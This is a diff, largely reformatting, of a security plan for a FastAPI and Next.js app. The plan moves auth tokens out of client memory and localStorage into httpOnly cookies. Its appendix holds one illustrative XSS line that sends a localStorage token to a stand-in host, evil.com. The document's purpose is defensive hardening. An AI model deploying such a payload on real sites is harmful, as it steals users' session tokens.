@@ -8,33 +8,38 @@
 ## 1. Overview
 
 ### 1.1 Summary
+
 Remove ALL authentication tokens from client-side memory and localStorage. The frontend should NEVER store `accessToken` or `refreshToken` - only maintain `user` data and `isAuthenticated` boolean. All token management is handled exclusively by httpOnly cookies on the backend.
 
 **Current Security Vulnerability (XSS)**:
+
 ```typescript
 // ❌ VULNERABLE - Tokens accessible via XSS
 interface AuthState {
-  accessToken: string | null;        // Attacker can read this
-  refreshTokenValue: string | null;  // Attacker can read this
+  accessToken: string | null; // Attacker can read this
+  refreshTokenValue: string | null; // Attacker can read this
 }
 ```
 
 **Target Secure State**:
+
 ```typescript
 // ✅ SECURE - No tokens in memory
 interface AuthState {
-  user: User | null;           // Non-sensitive user data only
-  isAuthenticated: boolean;     // Auth status flag
+  user: User | null; // Non-sensitive user data only
+  isAuthenticated: boolean; // Auth status flag
   // NO TOKENS - handled by httpOnly cookies
 }
 ```
 
 ### 1.2 Dependencies
+
 - [x] Backend already sets httpOnly cookies (verify in auth_router.py)
 - [x] server-check.ts already implements correct pattern
 - [x] localStorage v2 migration already removes tokens from persist (previous commit)
 
 ### 1.3 Links
+
 - Related Issue: Security Debt - Tokens in localStorage/memory
 - Reference Implementation: `apps/web/src/lib/auth/server-check.ts` ✅
 - Auth Store: `apps/web/src/stores/authStore.ts` ❌ (vulnerable)
@@ -48,11 +53,13 @@ interface AuthState {
 ### 2.1 User Stories
 
 #### US-SEC-001: Remove tokens from client memory
+
 **As a** Security-conscious developer
 **I want** Auth store to NOT contain access/refresh tokens
 **So that** XSS attacks cannot steal user credentials
 
 **Acceptance Criteria**:
+
 ```gherkin
 Scenario: Auth store has no token fields
   GIVEN authStore interface definition
@@ -71,11 +78,13 @@ Scenario: Login action does not store tokens
 ```
 
 #### US-SEC-002: Backend handles httpOnly cookies correctly
+
 **As a** Backend developer
 **I want** Login/Register endpoints to set httpOnly cookies
 **So that** frontend never receives tokens in response body
 
 **Acceptance Criteria**:
+
 ```gherkin
 Scenario: Login endpoint sets cookies
   GIVEN POST /api/auth/login request with valid credentials
@@ -89,11 +98,13 @@ Scenario: Login endpoint sets cookies
 ```
 
 #### US-SEC-003: Auth API client does not expose tokens
+
 **As a** Frontend developer
 **I want** authApi.login() to not return tokens in response
 **So that** client code cannot accidentally store them
 
 **Acceptance Criteria**:
+
 ```gherkin
 Scenario: Login API response shape
   GIVEN authApi.login() call succeeds
@@ -105,6 +116,7 @@ Scenario: Login API response shape
 ```
 
 ### 2.2 Functional Requirements
+
 - [ ] FR-SEC-001 Remove `accessToken` and `refreshTokenValue` from AuthState interface
 - [ ] FR-SEC-002 Remove `refreshToken()` action from authStore (use cookies instead)
 - [ ] FR-SEC-003 Update `login()` action to NOT store tokens
@@ -117,6 +129,7 @@ Scenario: Login API response shape
 - [ ] FR-SEC-010 Update authStore localStorage migrate v2→v3 (cleanup any old token data)
 
 ### 2.3 Non-Functional Requirements
+
 - **Security**: NO tokens in client memory or localStorage (XSS protection)
 - **Performance**: Auth checks should use server-check.ts cached pattern
 - **Compatibility**: Existing login/register flows should continue working
@@ -128,13 +141,13 @@ Scenario: Login API response shape
 
 ### 3.1 Tech Stack
 
-| Component | Technology | Version | Notes |
-|-----------|------------|---------|-------|
-| Backend | FastAPI | 0.115+ | httpOnly cookie support via Response.set_cookie() |
-| Frontend | Next.js | 16.1+ | Server Components + checkAuthServer pattern |
-| Frontend | React | 19.2 | Server Components preferred |
-| State | Zustand | 5.x | persist middleware with localStorage |
-| Cookies | httpOnly | - | Backend sets, browser auto-sends |
+| Component | Technology | Version | Notes                                             |
+| --------- | ---------- | ------- | ------------------------------------------------- |
+| Backend   | FastAPI    | 0.115+  | httpOnly cookie support via Response.set_cookie() |
+| Frontend  | Next.js    | 16.1+   | Server Components + checkAuthServer pattern       |
+| Frontend  | React      | 19.2    | Server Components preferred                       |
+| State     | Zustand    | 5.x     | persist middleware with localStorage              |
+| Cookies   | httpOnly   | -       | Backend sets, browser auto-sends                  |
 
 ### 3.2 Key Libraries
 
@@ -152,6 +165,7 @@ import { persist, createJSONStorage } from "zustand/middleware";
 ```
 
 ### 3.3 External Documentation
+
 - **Next.js 16 Auth Patterns**: https://nextjs.org/docs/app/building-your-application/authentication
 - **httpOnly Cookies**: https://owasp.org/www-community/attacks/Cross-site_scripting
 - **React Server Components**: https://react.dev/reference/react/use-server
@@ -164,6 +178,7 @@ import { persist, createJSONStorage } from "zustand/middleware";
 ### 4.1 Architecture Overview
 
 **BEFORE (Insecure - Current State)**:
+
 ```mermaid
 flowchart LR
     A[Login Form] -->|email/password| B[authApi.login]
@@ -175,6 +190,7 @@ flowchart LR
 ```
 
 **AFTER (Secure - Target State)**:
+
 ```mermaid
 flowchart LR
     A[Login Form] -->|email/password| B[authApi.login]
@@ -190,10 +206,13 @@ flowchart LR
 ### 4.2 Implementation Steps
 
 #### Step 1: Backend - Verify httpOnly Cookies (CRITICAL)
+
 **Files to modify**:
+
 - `apps/api/src/prosell/infrastructure/api/routers/auth_router.py`
 
 **Implementation notes**:
+
 ```python
 # Verify Login endpoint sets cookies correctly
 @router.post("/login")
@@ -232,6 +251,7 @@ async def login(
 ```
 
 **Gotchas**:
+
 - Verify ALL auth endpoints (login, register, refresh) set cookies
 - Check that cookie flags are correct (httpOnly, Secure, SameSite)
 - Frontend cannot read httpOnly cookies (by design!)
@@ -239,16 +259,19 @@ async def login(
 ---
 
 #### Step 2: Frontend - Update AuthState Interface
+
 **Files to modify**:
+
 - `apps/web/src/stores/authStore.ts`
 
 **Implementation notes**:
+
 ```typescript
 // ❌ BEFORE (vulnerable)
 interface AuthState {
   user: User | null;
-  accessToken: string | null;        // REMOVE
-  refreshTokenValue: string | null;  // REMOVE
+  accessToken: string | null; // REMOVE
+  refreshTokenValue: string | null; // REMOVE
   isAuthenticated: boolean;
   isLoading: boolean;
   error: AuthError | null;
@@ -258,7 +281,7 @@ interface AuthState {
   login: (credentials: LoginCredentials) => Promise<void>;
   register: (data: RegisterData) => Promise<void>;
   logout: () => Promise<void>;
-  refreshToken: () => Promise<void>;  // REMOVE
+  refreshToken: () => Promise<void>; // REMOVE
   updateUser: (updates: Partial<User>) => void;
   clearError: () => void;
   setLoading: (loading: boolean) => void;
@@ -273,7 +296,7 @@ interface AuthState {
   error: AuthError | null;
 
   // Actions - NO TOKEN MANAGEMENT
-  initializeAuth: () => Promise<void>;  // Uses server-check pattern
+  initializeAuth: () => Promise<void>; // Uses server-check pattern
   login: (credentials: LoginCredentials) => Promise<void>;
   register: (data: RegisterData) => Promise<void>;
   logout: () => Promise<void>;
@@ -285,6 +308,7 @@ interface AuthState {
 ```
 
 **Gotchas**:
+
 - Remove `refreshToken` action entirely (cookies handle refresh automatically)
 - Update all type references in components
 - Tests will need updates (remove token assertions)
@@ -292,10 +316,13 @@ interface AuthState {
 ---
 
 #### Step 3: Frontend - Update Store Implementation
+
 **Files to modify**:
+
 - `apps/web/src/stores/authStore.ts`
 
 **Implementation notes**:
+
 ```typescript
 export const useAuthStore = create<AuthState>()(
   persist(
@@ -312,7 +339,7 @@ export const useAuthStore = create<AuthState>()(
         try {
           const response = await authApi.login(
             credentials.email,
-            credentials.password
+            credentials.password,
           );
 
           // ✅ Store ONLY user data (tokens handled by cookies)
@@ -325,7 +352,8 @@ export const useAuthStore = create<AuthState>()(
         } catch (error) {
           set({
             error: {
-              message: error instanceof ApiError ? error.message : "Login failed",
+              message:
+                error instanceof ApiError ? error.message : "Login failed",
             },
             isLoading: false,
           });
@@ -340,7 +368,7 @@ export const useAuthStore = create<AuthState>()(
             data.email,
             data.password,
             data.first_name,
-            data.last_name
+            data.last_name,
           );
 
           // ✅ Store ONLY user data
@@ -362,8 +390,8 @@ export const useAuthStore = create<AuthState>()(
       initializeAuth: async () => {
         try {
           // Call /api/auth/state to get user from cookies
-          const response = await fetch('/api/auth/state', {
-            credentials: 'include',  // Send cookies
+          const response = await fetch("/api/auth/state", {
+            credentials: "include", // Send cookies
           });
 
           if (response.ok) {
@@ -441,12 +469,13 @@ export const useAuthStore = create<AuthState>()(
 
         return persistedState as AuthState;
       },
-    }
-  )
+    },
+  ),
 );
 ```
 
 **Gotchas**:
+
 - `initializeAuth` should call `/api/auth/state` endpoint (create if doesn't exist)
 - All token references removed from state
 - localStorage migration v3 ensures cleanup
@@ -454,10 +483,13 @@ export const useAuthStore = create<AuthState>()(
 ---
 
 #### Step 4: Auth API Client - Remove Tokens from Response
+
 **Files to modify**:
+
 - `apps/web/src/lib/api/authApi.ts`
 
 **Implementation notes**:
+
 ```typescript
 // ❌ BEFORE (returns tokens)
 interface LoginResponse {
@@ -512,6 +544,7 @@ export const authApi = {
 ```
 
 **Gotchas**:
+
 - `credentials: "include"` is CRITICAL - sends httpOnly cookies automatically
 - Backend clears cookies on logout (Set-Cookie with expired date)
 - No manual token refresh needed (cookies auto-sent)
@@ -519,10 +552,13 @@ export const authApi = {
 ---
 
 #### Step 5: Backend - Create /api/auth/state Endpoint
+
 **Files to modify**:
+
 - `apps/api/src/prosell/infrastructure/api/routers/auth_router.py`
 
 **Implementation notes**:
+
 ```python
 from fastapi import APIRouter, Depends, Cookie
 from starlette.requests import Request
@@ -569,6 +605,7 @@ async def get_auth_state(
 ```
 
 **Gotchas**:
+
 - This endpoint does NOT return tokens (only user data)
 - Uses `Cookie()` dependency to read httpOnly cookie
 - Returns null user if token is invalid/missing
@@ -576,11 +613,14 @@ async def get_auth_state(
 ---
 
 #### Step 6: Update Tests
+
 **Files to modify**:
+
 - `apps/web/tests/stores/authStore.test.ts`
 - All component tests that use authStore
 
 **Implementation notes**:
+
 ```typescript
 // ❌ BEFORE (tests check tokens)
 describe("authStore", () => {
@@ -589,7 +629,7 @@ describe("authStore", () => {
     await act(async () => {
       await result.current.login({ email, password });
     });
-    expect(result.current.accessToken).toBe("fake-token");  // ❌ REMOVE
+    expect(result.current.accessToken).toBe("fake-token"); // ❌ REMOVE
     expect(result.current.isAuthenticated).toBe(true);
   });
 });
@@ -601,13 +641,14 @@ describe("authStore", () => {
     await act(async () => {
       await result.current.login({ email, password });
     });
-    expect(result.current.user).toEqual({  // ✅ CHECK USER
+    expect(result.current.user).toEqual({
+      // ✅ CHECK USER
       id: "1",
       email: "test@example.com",
       // ...
     });
     expect(result.current.isAuthenticated).toBe(true);
-    expect(result.current.accessToken).toBeUndefined();  // ✅ VERIFY NO TOKEN
+    expect(result.current.accessToken).toBeUndefined(); // ✅ VERIFY NO TOKEN
   });
 
   it("should not expose tokens in state", () => {
@@ -621,6 +662,7 @@ describe("authStore", () => {
 ```
 
 **Gotchas**:
+
 - Mock MSW (Mock Service Worker) handlers for /api/auth/state
 - Remove all token assertions from tests
 - Verify cookies are sent with `credentials: "include"`
@@ -656,8 +698,8 @@ export const checkAuthServer = cache(async function checkAuthServer() {
 ```typescript
 // ✅ SECURE: No tokens in client memory
 interface AuthState {
-  user: User | null;           // Public data only
-  isAuthenticated: boolean;     // Status flag
+  user: User | null; // Public data only
+  isAuthenticated: boolean; // Status flag
   // NO: accessToken, refreshTokenValue
 }
 
@@ -665,11 +707,11 @@ interface AuthState {
 login: async (credentials) => {
   const response = await authApi.login(email, password);
   set({
-    user: response.user,       // ✅ User data
-    isAuthenticated: true,     // ✅ Status
+    user: response.user, // ✅ User data
+    isAuthenticated: true, // ✅ Status
     // Tokens handled by httpOnly cookies - NOT in memory
   });
-}
+};
 ```
 
 ### 5.3 Backend Cookie Pattern
@@ -755,21 +797,25 @@ grep -n 'credentials: "include"' authApi.ts | wc -l  # Should be > 0
 ## 7. Testing Strategy
 
 ### 7.1 Unit Tests
+
 - **authStore tests** - Verify no token fields, correct user data storage
 - **authApi tests** - Verify credentials: "include" in all requests
 - **component tests** - Mock /api/auth/state endpoint
 
 ### 7.2 Integration Tests
+
 - **Login flow** - Verify cookies are set correctly
 - **Protected routes** - Verify httpOnly cookies are sent automatically
 - **Token refresh** - Verify backend handles refresh (not client)
 
 ### 7.3 E2E Tests
+
 - **User login** - Full flow from form to authenticated state
 - **Page refresh** - Verify user persists via cookies
 - **Logout** - Verify cookies are cleared
 
 ### 7.4 Coverage Targets
+
 - Frontend tests: All 316 tests passing
 - Backend auth tests: All passing
 - Security validation: No tokens in client code
@@ -779,23 +825,28 @@ grep -n 'credentials: "include"' authApi.ts | wc -l  # Should be > 0
 ## 8. Common Pitfalls
 
 ### 8.1 Forgetting credentials: "include"
+
 **Problem**: fetch() calls don't send cookies without `credentials: "include"`
 **Solution**: Add to ALL authApi fetch calls
+
 ```typescript
 fetch(url, {
-  credentials: "include",  // ✅ REQUIRED for httpOnly cookies
+  credentials: "include", // ✅ REQUIRED for httpOnly cookies
 });
 ```
 
 ### 8.2 Reading httpOnly cookies in client
+
 **Problem**: `document.cookie` cannot read httpOnly cookies (by design!)
 **Solution**: Use `/api/auth/state` endpoint to get user data from cookies
 
 ### 8.3 Still returning tokens in backend response
+
 **Problem**: Backend returns tokens in JSON body (XSS vulnerable)
 **Solution**: Remove `tokens` from response DTO, only set via Set-Cookie header
 
 ### 8.4 Tests still checking tokens
+
 **Problem**: Tests assert that `accessToken` is set after login
 **Solution**: Update tests to check `user` and `isAuthenticated` only
 
@@ -804,12 +855,14 @@ fetch(url, {
 ## 9. Rollback Plan
 
 If implementation fails:
+
 1. Revert authStore.ts to previous version (v2 with tokens in state)
 2. Revert authApi.ts to return tokens in response
 3. Keep localStorage v2 migration (no harm done)
 4. Document rollback reason and create follow-up PRP
 
 **Rollback command**:
+
 ```bash
 git revert <commit-hash>
 git push
@@ -844,6 +897,7 @@ git push
 **Reasoning**:
 
 **Positive factors**:
+
 - ✅ Reference implementation exists (`server-check.ts`)
 - ✅ Pattern is well-established (httpOnly cookies)
 - ✅ localStorage v2 migration already done (partial fix)
@@ -852,17 +906,20 @@ git push
 - ✅ Tests are comprehensive (316 frontend tests)
 
 **Risk factors**:
+
 - ⚠️ Many files changed (authStore, authApi, tests, components)
 - ⚠️ Breaking change to AuthState interface (affects all components)
 - ⚠️ E2E tests may need updates
 - ⚠️ MSW mocks need /api/auth/state endpoint
 
 **Why not 10/10**:
+
 - Significant interface changes to AuthState
 - Potential for regressions in auth flow
 - Requires coordination between backend and frontend changes
 
 **Mitigation**:
+
 - Incremental implementation (verify backend first)
 - Comprehensive test coverage
 - Security validation gates
@@ -875,14 +932,16 @@ git push
 ### Why httpOnly Cookies?
 
 **XSS Vulnerability with localStorage/memory**:
+
 ```javascript
 // ❌ VULNERABLE
-const token = localStorage.getItem('access_token');
+const token = localStorage.getItem("access_token");
 // Attacker can read this via XSS:
 // <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'))</script>
 ```
 
 **httpOnly Cookies Protection**:
+
 ```javascript
 // ✅ SECURE
 // Client-side JavaScript CANNOT read httpOnly cookies
@@ -891,6 +950,7 @@ const token = localStorage.getItem('access_token');
 ```
 
 ### References
+
 - OWASP XSS Prevention: https://owasp.org/www-community/attacks/xss/
 - httpOnly Cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
 - Next.js Auth Patterns: https://nextjs.org/docs/app/building-your-application/authentication
